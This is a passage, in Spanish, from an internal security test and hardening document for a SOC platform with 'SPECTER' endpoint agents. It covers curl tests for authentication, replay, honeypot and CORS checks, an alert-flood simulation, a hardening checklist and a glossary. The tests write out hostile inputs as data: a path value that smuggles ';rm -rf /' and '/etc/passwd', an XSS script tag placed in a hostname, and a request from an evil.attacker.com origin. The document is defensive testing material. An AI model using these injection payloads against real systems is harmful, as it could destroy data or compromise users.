curl -H "Authorization: Bearer $INVALID_JWT" \
  http://localhost:8000/api/v1/alerts
# Esperado: 401 — NUNCA 200

# JWT con firma incorrecta
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.invalidsig" \
  http://localhost:8000/api/v1/alerts
# Esperado: 401

# ── SPECTER Agent Security ─────────────────────────────────────────────────────

# Registro sin enrollment token (cuando SPECTER_ENROLLMENT_SECRET configurado)
curl -X POST http://localhost:8000/api/v1/agents/register \
  -H "Content-Type: application/json" \
  -d '{"hostname":"fake-agent","public_key":"...","os":"linux"}'
# Esperado: 401

# Comando con timestamp stale (replay)
STALE_CMD='{"id":"1","command_type":"kill_process","params":{"pid":1},"ts":1000000}'
# Esperado: agente rechaza con "stale command"

# Injection en params de comando
curl -X POST "http://localhost:8000/api/v1/agents/{id}/command" \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -H "Content-Type: application/json" \
  -d '{"command_type":"quarantine_file","params":{"path":"/../etc/passwd;rm -rf /"}}'
# Esperado: 422 (injection detectada)

# ── Honeypot Validation ────────────────────────────────────────────────────────

# Verificar que honeypots retornan 200 (no delatan trampa)
curl -s -o /dev/null -w "%{http_code}" http://localhost:8000/api/v1/agents/probe
# Esperado: 200

# Verificar que honeypots NO aparecen en OpenAPI
curl -s http://localhost:8000/api/v1/openapi.json | \
  python3 -c "import json,sys; paths=json.load(sys.stdin)['paths']; \
  assert '/api/v1/agents/probe' not in paths, 'PROBE EXPUESTO EN DOCS'"

# Verificar que canary callback retorna 404 (sin revelar trampa)
curl -s -o /dev/null -w "%{http_code}" \
  http://localhost:8000/api/v1/c/00000000000000000000000000000000
# Esperado: 404

# ── Frontend/API ───────────────────────────────────────────────────────────────

# XSS via hostname de agente
MALICIOUS_HOSTNAME='<script>alert(1)</script>'
# Verificar que el frontend escapa correctamente en renderizado

# IDOR: analyst-A accede a alerta de analyst-B
# (requiere dos tokens y recursos conocidos)

# Headers de seguridad
curl -si http://localhost:8000/health | \
  grep -E "(X-Content-Type-Options|X-Frame-Options|Content-Security-Policy)"

# CORS — origen no permitido
curl -si -H "Origin: https://evil.attacker.com" \
  http://localhost:8000/api/v1/alerts | grep "Access-Control-Allow-Origin"
# NO debe aparecer evil.attacker.com
```

### 7.3 Tests de Fatiga de Alertas — Simulación

```bash
# Simular atacante generando ruido antes del ataque real
# (test de que el sistema de deduplicación funciona)

python3 - << 'EOF'
import asyncio, httpx, json

async def simulate_noise_attack():
    """Genera 100 eventos de baja severidad para verificar que el SOC
    no se satura y que los eventos críticos siguen siendo visibles."""

    async with httpx.AsyncClient() as client:
        # Login como agente
        token = "..."

        # Flood de eventos low-severity
        for i in range(100):
            await client.post("/api/v1/events/", json={
                "agent_id": "test-agent",
                "event_type": "network_connection",
                "severity": "low",
                "data": {"dst_port": 80 + i}
            }, headers={"Authorization": f"Bearer {token}"})

        # Verificar que el dashboard muestra 1 alerta agrupada,
        # no 100 alertas individuales
        resp = await client.get("/api/v1/alerts?severity=low")
        alerts = resp.json()
        print(f"Alertas en dashboard: {len(alerts)}")
        # Con deduplicación correcta: debería ser 1, no 100

asyncio.run(simulate_noise_attack())
EOF
```

---

## 8. Checklist de Hardening

### 8.1 Implementado ✅

- [x] JWT con expiración corta + refresh rotation
- [x] RBAC 3 niveles (admin/analyst/viewer)
- [x] SPECTER enrollment token (HMAC rolling 1h)
- [x] Command freshness guard (anti-replay 300s)
- [x] Rate limiter por agent_id (sliding window)
- [x] Ed25519 dual signing (agente + backend)
- [x] Canary ping (proof of key possession)
- [x] Shell injection detection (regex allowlist)
- [x] Command param schema allowlist
- [x] Honeypot endpoints (probe/dump/export)
- [x] Attacker fingerprinting (SHA-256 cross-session hash)
- [x] IP reputation lookup (ip-api.com + AbuseIPDB)
- [x] Signed evidence reports (HMAC-SHA256 tamper-evident)
- [x] Canary token system (UUID traceable URLs)
- [x] Suspicious registration detection
- [x] X-Specter-Guard header (authenticity seal)
- [x] HTTPS enforcement en agente (con modo strict)
- [x] Structured JSON audit logging (no log injection)
- [x] Sensitive headers stripped from fingerprint storage

### 8.2 Pendiente — Alta Prioridad ⚠️

- [ ] Rate limiter en `POST /auth/login` específicamente
- [ ] Account lockout tras N auth failures (actualmente no implementado)
- [ ] `follow_redirects=False` explícito en todos los adapters (anti-SSRF)
- [ ] JWT blacklist en logout (actualmente tokens válidos hasta expirar)
- [ ] CSP headers en frontend (`next.config.js`)
- [ ] 2FA/TOTP para roles admin y analyst
- [ ] Token blacklist en logout
- [ ] Hash integrity en audit log (append-only + Merkle tree o similar)

### 8.3 Pendiente — Media Prioridad 🔶

- [ ] `requirements.txt` con hash pinning (`--require-hashes`)
- [ ] SBOM (Software Bill of Materials) generado en CI/CD
- [ ] Behavioral alertas sobre acceso anómalo por analistas (insider threat)
- [ ] Alert deduplication por firma (anti-fatigue)
- [ ] Alert suppression con ventana temporal y auto-expiración
- [ ] Timing jitter en honeypot responses (anti side-channel fingerprinting)
- [ ] Canary credentials en Active Directory (cross-system canary tracing)
- [ ] Behavioral correlation cross-módulo (honeypot + auth + SPECTER)
- [ ] Progressive evidence chain (honeypot multi-nivel)

### 8.4 Roadmap de Seguridad — Largo Plazo 🔷

- [ ] HashiCorp Vault para gestión de secretos (Fase 4)
- [ ] Multi-tenancy con aislamiento completo (Fase 5)
- [ ] mTLS entre agente y backend (SPECTER v2)
- [ ] DLP (Data Loss Prevention) en descarga masiva de alertas
- [ ] Red team exercises periódicos (90 días)
- [ ] Threat hunting playbooks automatizados

---

## Apéndice A — Vocabulario de Amenazas

| Término | Definición |
|---------|-----------|
| Dwell Time | Tiempo entre compromiso inicial y detección. Target PremosCorp: <24h |
| True Positive (TP) | Alerta que corresponde a amenaza real |
| False Positive (FP) | Alerta que no corresponde a amenaza real (ruido) |
| Alert Fatigue | Degradación de respuesta SOC por volumen excesivo de alertas |
| Noise Injection | Ataque que genera ruido deliberado para ocultar actividad real |
| Low-and-Slow | Técnica de exfiltración de bajo volumen por largo tiempo |
| Canary Token | URL/credencial rastreable que alerta cuando es usada |
| Canary Ping | Prueba de posesión de clave privada por un agente SPECTER |
| Enrollment Token | Token HMAC-SHA256 rolling que autoriza registro de agente |
| Honeypot | Sistema/endpoint trampa que no tiene valor productivo |
| IOC | Indicator of Compromise — artefacto que evidencia amenaza |
| TTP | Tactics, Techniques and Procedures — cómo opera un adversario |
| MITRE ATT&CK | Framework de conocimiento de TTPs de adversarios reales |
| SSRF | Server-Side Request Forgery — forzar al servidor a hacer requests |
| IDOR | Insecure Direct Object Reference — acceso a recursos ajenos |

---

## Apéndice B — Comandos de Verificación Rápida

```bash
# Estado completo del sistema de seguridad ASC
cd backend

# 1. Tests unitarios de seguridad
python -m pytest tests/test_specter_security.py tests/test_honeypot.py -v --tb=short

# 2. Suite completa con cobertura
python -m pytest --tb=short -q

# 3. Scan de secretos (manual mientras gitleaks no esté en PATH)
grep -rEn "(?i)(password|secret|api_key|token)\s*=\s*['\"][^'\"]{8,}" \
  app/ --include="*.py" | grep -v "nosec\|test\|\.pyc"

# 4. Verificar que .env no está en git
git ls-files | grep "^\.env" && echo "ALERTA: .env en git" || echo "OK"

# 5. Buscar subprocess con shell=True (vulnerabilidad de inyección)
grep -rn "shell=True" app/ --include="*.py"
# Resultado esperado: 0 matches

# 6. Verificar honeypot invisible en docs
python3 -c "
import httpx, asyncio
async def check():
    async with httpx.AsyncClient(base_url='http://localhost:8000') as c:
        r = await c.get('/api/v1/openapi.json')
        paths = r.json()['paths']
        traps = [p for p in paths if any(t in p for t in ['probe','dump','export','/c/'])]
        print('Honeypots en OpenAPI:', traps or 'NINGUNO (correcto)')
asyncio.run(check())
"

# 7. Verificar X-Specter-Guard en respuestas del agente
curl -si http://localhost:8000/api/v1/agents/probe | grep X-Specter-Guard
```

---

*Documento generado por el equipo de seguridad de ASC PremosCorp.*
*Clasificación: INTERNO — no distribuir externamente.*
*Próxima revisión: 2026-09-08 (90 días) o después de cualquier incidente de seguridad.*
